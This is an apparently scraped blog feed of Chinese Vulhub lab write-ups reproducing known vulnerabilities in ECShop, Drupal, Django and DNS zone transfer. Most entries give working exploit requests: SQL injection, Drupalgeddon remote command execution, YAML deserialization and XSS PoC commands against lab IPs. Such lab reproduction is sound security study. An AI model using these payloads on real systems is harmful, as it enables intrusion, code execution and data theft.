<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;user.php?act&#x3D;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Cookie: PHPSESSID&#x3D;9odrkfn7munb3vfksdhldob2d0; ECS_ID&#x3D;1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]&#x3D;1</span><br><span class="line">Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*&#x2F;SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION&#x2F;*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>2.X 的结果：</p>
<p><img src="https://image.3001.net/images/20210719/16266616837974.png" alt="image-20210719101439684">3.X 的结果：</p>
<p><img src="https://image.3001.net/images/20210719/16266616856749.png" alt="image-20210719101550223"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ECShop</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal &lt; 7.32 &quot;Drupalgeddon&quot; SQL 注入漏洞 (CVE-2014-3704)</title>
    <url>/2021/07/14/Drupal%E3%80%8A7.32%20Drupalgeddon%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2014-3704)/</url>
    <content><![CDATA[<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL-注入漏洞-CVE-2014-3704"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL-注入漏洞-CVE-2014-3704" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL 注入漏洞 (CVE-2014-3704)"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL 注入漏洞 (CVE-2014-3704)</h1><p>Drupal 是一个免费的开源 Web 内容管理框架，用 PHP 编写并在 GNU 通用公共许可证下分发。</p>
<p>Drupal core 7.x 7.32之前的数据库抽象API中的expandArguments函数没有正确构造prepared statement，这使得远程攻击者可以通过包含精心制作的key的数组进行SQL注入攻击。</p>
<a id="more"></a>

<p>启动Drupal 7.31 环境。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务器启动后，浏览<code>http://192.168.44.132:8080</code>查看Drupal安装向导，使用默认配置进行安装。</p>
<p>注意Mysql数据库名称是<code>drupal</code>，数据库用户名和密码是<code>root</code>，地址是<code>mysql</code>：</p>
<p><img src="https://image.3001.net/images/20210714/16262709089522.png" alt="image-20210714104527357"></p>
<p>安装完成后，浏览主页。</p>
<p><img src="https://image.3001.net/images/20210714/1626270912398.png" alt="image-20210714104712395"></p>
<p>SQL 注入不需要身份验证，可以通过发送以下请求来执行恶意 SQL 语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure>

<p>可以看出，SQL 语句报告了一条包含用户数据的错误消息。</p>
<p><img src="https://image.3001.net/images/20210714/16262709178710.png" alt="image-20210714105545912"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal 远程代码执行漏洞（CVE-2018-7602）</title>
    <url>/2021/07/14/Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a>Drupal 远程代码执行漏洞（CVE-2018-7602）</h1><ul>
<li>影响软件：drupal</li>
<li>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤</li>
<li>效果：任意命令执行</li>
</ul>
<a id="more"></a>

<p>启动drupal 7.57的环境。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://your-ip:8081/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
<p>参考<a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py" target="_blank" rel="noopener">pimps/CVE-2018-7600</a>的PoC。</p>
<p>如下图所示，执行以下命令即可复现该漏洞。示例命令为 <code>id</code>，如图红框中显示，可以执行该命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &quot;id&quot;为要执行的命令 第一个admin为用户名 第二个admin为密码</span><br><span class="line">python3 drupa7-CVE-2018-7602.py -c &quot;id&quot; admin admin http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210714/16262706492953.png" alt="image-20210714145341763"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal 远程代码执行漏洞（CVE-2019-6339）</title>
    <url>/2021/07/14/Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6339%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Drupal-远程代码执行漏洞（CVE-2019-6339）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）"></a>Drupal 远程代码执行漏洞（CVE-2019-6339）</h1><ul>
<li>影响软件：Drupal</li>
<li>方式：phar反序列化RCE</li>
<li>参考链接：<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></li>
<li>效果：任意命令执行</li>
</ul>
<a id="more"></a>

<p>启动drupal 8.5.0的环境。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://192.168.44.132:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
<p>先使用管理员用户上传头像，头像图片为构造好的 PoC，参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal" target="_blank" rel="noopener">thezdi/PoC</a>的PoC。</p>
<p><img src="https://image.3001.net/images/20210714/16262707898542.png" alt="image-20210714160530039"></p>
<p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p>
<p>访问 <code>http://192.168.44.132:8080/admin/config/media/file-system</code>，在 <code>Temporary directory</code> 处输入之前上传的图片路径，示例为 <code>phar://./sites/default/files/pictures/2021-07/blog-ZDI-CAN-7232-cat.jpg</code>，保存后将触发该漏洞。如下图所示，触发成功。</p>
<p><img src="https://image.3001.net/images/20210714/16262707935562.png" alt="image-20210714160958748"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal XSS漏洞（CVE-2019-6341）</title>
    <url>/2021/07/14/Drupal%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6341%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Drupal-XSS漏洞（CVE-2019-6341）"><a href="#Drupal-XSS漏洞（CVE-2019-6341）" class="headerlink" title="Drupal XSS漏洞（CVE-2019-6341）"></a>Drupal XSS漏洞（CVE-2019-6341）</h1><ul>
<li>影响软件：Drupal</li>
<li>方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞</li>
<li>参考链接：<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></li>
<li>效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）</li>
</ul>
<a id="more"></a>

<p>启动drupal 8.5.0的环境。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://192.168.44.132:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
<p>该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。</p>
<p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p>
<p>使用PoC上传构造好的伪造GIF文件，PoC参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal" target="_blank" rel="noopener">thezdi/PoC</a>的PoC。</p>
<p>如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php blog-poc.php 192.168.44.132 8080</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210714/16262705016999.png" alt="image-20210714170033517"></p>
<p>上传成功后，访问图片位置，<code>http://192.168.44.132:8080/sites/default/files/pictures/2021-07/_0</code> 即可触发 XSS 漏洞，如下图所示。</p>
<p><img src="https://image.3001.net/images/20210714/16262705035010.png" alt="image-20210714170023505"></p>
<p>Tips:</p>
<ol>
<li>因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。</li>
<li>访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600)</title>
    <url>/2021/07/14/Drupal%20Drupalgeddon%202%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2018-7600)/</url>
    <content><![CDATA[<h1 id="Drupal-Drupalgeddon-2-远程代码执行漏洞-CVE-2018-7600"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞-CVE-2018-7600" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600)"></a>Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600)</h1><p>7.58 之前的 Drupal、8.3.9 之前的 8.x、8.4.6 之前的 8.4.x 和 8.5.1 之前的 8.5.x 允许远程攻击者执行任意代码，因为一个问题会影响具有默认或通用模块配置的多个子系统，包括表单 API。</p>
<a id="more"></a>

<p>参考：</p>
<ul>
<li><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></li>
</ul>
<p>启动易受攻击的 Drupal 8.5.0 环境。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>环境启动后，访问<code>http://192.168.44.132:8080/</code>，会看到drupal安装页面。使用“标准”配置文件完成 drupal 安装。因为没有mysql环境，安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。</p>
<p>参考<a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py" target="_blank" rel="noopener">a2u/CVE-2018-7600</a>，我们可以向drupal发送以下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;register?element_parents&#x3D;account&#x2F;mail&#x2F;%23value&amp;ajax_form&#x3D;1&amp;_wrapper_format&#x3D;drupal_ajax HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_register_form&amp;_drupal_ajax&#x3D;1&amp;mail[#post_render][]&#x3D;exec&amp;mail[#type]&#x3D;markup&amp;mail[#markup]&#x3D;id</span><br></pre></td></tr></table></figure>

<p>成功执行代码后，执行 id 命令：</p>
<p><img src="https://image.3001.net/images/20210714/16262704054609.png" alt="image-20210714141919387"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</title>
    <url>/2021/07/14/Drupal%20Core%208%20PECL%20YAML%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-6920%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）"></a>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</h1><ul>
<li>影响软件：Drupal</li>
<li>方式：反序列化</li>
<li>参考链接：<a href="https://paper.seebug.org/334/" target="_blank" rel="noopener">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></li>
<li>效果：任意代码执行</li>
</ul>
<a id="more"></a>

<p>启动 drupal 8.3.0 的环境。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://192.168.44.132:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
<ul>
<li>先安装 <code>yaml</code> 扩展，需要先进入容器 <code>docker exec -it [id] /bin/bash</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源</span><br><span class="line">cat &gt; sources.list &lt;&lt; EOF</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib</span><br><span class="line">EOF</span><br><span class="line"># 安装依赖</span><br><span class="line">apt update</span><br><span class="line">apt-get -y install gcc make autoconf libc-dev pkg-config</span><br><span class="line">apt-get -y install libyaml-dev</span><br><span class="line"># 安装yaml扩展</span><br><span class="line">pecl install yaml</span><br><span class="line">docker-php-ext-enable yaml.so</span><br><span class="line"># 启用 yaml.decode_php 否则无法复现成功</span><br><span class="line">echo &#39;yaml.decode_php &#x3D; 1 &#x3D; 1&#39;&gt;&gt;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;docker-php-ext-yaml.ini</span><br><span class="line"># 退出容器</span><br><span class="line">exit</span><br><span class="line"># 重启容器，CONTAINER换成自己的容器ID</span><br><span class="line">docker restart CONTAINER</span><br></pre></td></tr></table></figure>

<ul>
<li>.登录一个管理员账号</li>
<li>2.访问 <code>http://127.0.0.1:8080/admin/config/development/configuration/single/import</code></li>
<li>3.如下图所示，<code>Configuration type</code> 选择 <code>Simple configuration</code>，<code>Configuration name</code> 任意填写，<code>Paste your configuration here</code> 中填写PoC如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!php&#x2F;object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210714/16262703105674.png" alt="image-20210714111843786"></p>
<ul>
<li>4.点击 <code>Import</code> 后可以看到漏洞触发成功，弹出 <code>phpinfo</code> 页面。</li>
</ul>
<p><img src="https://image.3001.net/images/20210714/16262703136356.png" alt="image-20210714112907957"></p>
<ul>
<li>Tips：<ul>
<li>虽然官方 CPE 信息显示从 <code>8.0.0</code> 开始就有该漏洞，但是在 <code>drupal:8.0.0</code> 容器内并没有复现成功，相同操作在 <code>drupal:8.3.0</code> 则可以复现成功，故基础镜像选择<code>drupal:8.3.0</code></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS 区域传输 (AXFR)</title>
    <url>/2021/07/13/DNS%20%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%20(AXFR)/</url>
    <content><![CDATA[<h1 id="DNS-区域传输-AXFR"><a href="#DNS-区域传输-AXFR" class="headerlink" title="DNS 区域传输 (AXFR)"></a>DNS 区域传输 (AXFR)</h1><p>使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编辑信息的需要，您可以在一台服务器上编辑信息并使用 AXFR 将信息复制到其他服务器。但是，如果您不保护您的服务器，恶意方可能会使用 AXFR 来获取有关您所有主机的信息。</p>
<a id="more"></a>

<p>参考：</p>
<ul>
<li><a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/dns-zone-transfer.html</a></li>
</ul>
<p>Vulhub 使用<a href="https://wiki.debian.org/Bind9" target="_blank" rel="noopener">Bind9</a>构建 dns 服务器，但这并不意味着只有 Bind9 支持 AXFR 记录。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行DNS服务器，环境运行后，会监听 TCP 和 UDP 的 53 端口，DNS 协议支持从这两个端口传输数据。</p>
<p>在Linux下，我们可以使用<strong>dig</strong>命令发送AXFR记录请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @your-ip -t axfr vulhub.org</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210714/1626229870242.png" alt="image-20210714102102742"></p>
<p>得到了的所有子域记录<code>vulhub.org</code>，这里有一个 DNS 区域传输漏洞。</p>
<p>我们也可以使用 Nmap 脚本来扫描这个漏洞： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain&#x3D;vulhub.org&quot; -Pn -p 53 your-ip</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210714/16262298732059.png" alt="image-20210714102657606"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>Django GIS 函数和聚合上的Oracle SQL 注入漏洞 (CVE-2020-9402)</title>
    <url>/2021/07/12/Django%20GIS%20%E5%87%BD%E6%95%B0%E5%92%8C%E8%81%9A%E5%90%88%E4%B8%8A%E7%9A%84Oracle%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2020-9402)/</url>
    <content><![CDATA[<h1 id="Django-GIS-函数和聚合上的Oracle-SQL-注入漏洞-CVE-2020-9402"><a href="#Django-GIS-函数和聚合上的Oracle-SQL-注入漏洞-CVE-2020-9402" class="headerlink" title="Django GIS 函数和聚合上的Oracle SQL 注入漏洞 (CVE-2020-9402)"></a>Django GIS 函数和聚合上的Oracle SQL 注入漏洞 (CVE-2020-9402)</h1><p>Django 于 2020 年 3 月 4 日发布了安全更新，修复了 GIS 函数和聚合中的 SQL 注入漏洞。</p>
<a id="more"></a>

<p>参考链接：</p>
<ul>
<li><a href="https://www.djangoproject.com/weblog/2020/mar/04/security-releases/" target="_blank" rel="noopener">https://www.djangoproject.com/weblog/2020/mar/04/security-releases/</a></li>
</ul>
<p>该漏洞需要开发者使用JSONField/HStoreField；并且可以控制查询集的字段名称。Django 的内置应用程序 Django-Admin 受到影响，这为我们提供了一个简单的方法来重现该漏洞。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，就可以看到Django的主页了<code>http://192.168.44.132:8000</code>。</p>
<p>访问网站 <code>http://192.168.44.132:8000/vuln/</code></p>
<p>然后添加<code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1</code>到 GET para,eter，其中 q 是 quertset：</p>
<p><a href="http://192.168.44.132:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual" target="_blank" rel="noopener">http://192.168.44.132:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual</a> )%20is%20null%20%20OR%20 %3D 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v%24instance)) from dual) is null  OR ) (1%2B1可以看到括号已经注入成功，SQL语句报错：</p>
<p><img src="https://image.3001.net/images/20210712/16260987755440.png" alt="image-20210712215031879"></p>
<p>或者您可以评估其他网站<code>http://your-ip:8000/vuln2/</code>，并添加<code>0.05))) FROM &quot;VULN_COLLECTION2&quot; where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --</code>到 GET para,eter，其中 q 是 quertset：</p>
<p><a href="http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL)" target="_blank" rel="noopener">http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL)</a> ))%20from%20dual)%20is%20not%20null%20%20–)) FROM “VULN_COLLECTION2”  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  –)</p>
<p>还可以看到SQL语句报错：</p>
<p><img src="https://image.3001.net/images/20210712/16260987785996.png" alt="image-20210712215052634"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django JSONField/HStoreField SQL 注入漏洞 (CVE-2019-14234)</title>
    <url>/2021/07/12/Django%20JSONField%E3%80%81HStoreField%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2019-14234)/</url>
    <content><![CDATA[<h1 id="Django-JSONField-HStoreField-SQL-注入漏洞-CVE-2019-14234"><a href="#Django-JSONField-HStoreField-SQL-注入漏洞-CVE-2019-14234" class="headerlink" title="Django JSONField/HStoreField SQL 注入漏洞 (CVE-2019-14234)"></a>Django JSONField/HStoreField SQL 注入漏洞 (CVE-2019-14234)</h1><p>Django 于 2019 年 8 月 1 日发布了安全更新，修复了 JSONField 和 HStoreField 两个模型字段中的 SQL 注入漏洞。</p>
<a id="more"></a>

<p>参考链接：</p>
<ul>
<li><a href="https://www.djangoproject.com/weblog/2019/aug/01/security-releases/" target="_blank" rel="noopener">https://www.djangoproject.com/weblog/2019/aug/01/security-releases/</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></li>
</ul>
<p>该漏洞需要开发者使用JSONField/HStoreField；并且可以控制查询集的字段名称。Django 的内置应用程序 Django-Admin 受到影响，这为我们提供了一个简单的方法来重现该漏洞。 </p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，就可以看到Django的主页了<code>http://192.168.44.132:8000</code>。</p>
<p>首先，访问<code>http://192.168.44.132:8000/admin/</code>使用 username<code>admin</code>和 password<code>a123123123</code>登录到 Django-Admin 。</p>
<p>然后转到<code>http://192.168.44.132:8000/admin/vuln/collection/</code>模型的列表视图<code>Collection</code>：</p>
<p><img src="https://image.3001.net/images/20210712/1626098165490.png" alt="image-20210712212141883"></p>
<p>添加<code>detail__a&#39;b=123</code>到GET参数，其中<code>detail</code>JSONField：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8000&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__a%27b&#x3D;123</span><br></pre></td></tr></table></figure>

<p>可以看到单引号已经注入成功，SQL语句报错：</p>
<p><img src="https://image.3001.net/images/20210712/16260981686328.png" alt="image-20210712212240753"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django &lt; 2.0.8 在 CommonMiddleware 中打开重定向可能性 (CVE-2018-14574)</title>
    <url>/2021/07/12/Django%E3%80%8A2.0.8%20%E5%9C%A8%20CommonMiddleware%20%E4%B8%AD%E6%89%93%E5%BC%80%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%AF%E8%83%BD%E6%80%A7%20(CVE-2018-14574)/</url>
    <content><![CDATA[<h1 id="Django-lt-2-0-8-在-CommonMiddleware-中打开重定向可能性-CVE-2018-14574"><a href="#Django-lt-2-0-8-在-CommonMiddleware-中打开重定向可能性-CVE-2018-14574" class="headerlink" title="Django &lt; 2.0.8 在 CommonMiddleware 中打开重定向可能性 (CVE-2018-14574)"></a>Django &lt; 2.0.8 在 CommonMiddleware 中打开重定向可能性 (CVE-2018-14574)</h1><p>如果<code>django.middleware.common.CommonMiddleware</code>和<code>APPEND_SLASH</code>设置都已启用，并且项目的 URL 模式接受以斜杠结尾的任何路径，则对该站点的恶意制作的 URL 的请求可能会导致重定向到另一个站点，从而启用网络钓鱼和其他攻击。</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现在访问<code>http://your-ip:8000//www.example.com</code>，您将被重定向到<code>//www.example.com/</code>：</p>
<p><img src="https://image.3001.net/images/20210712/16260830005593.png" alt="image-20210712174306678"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
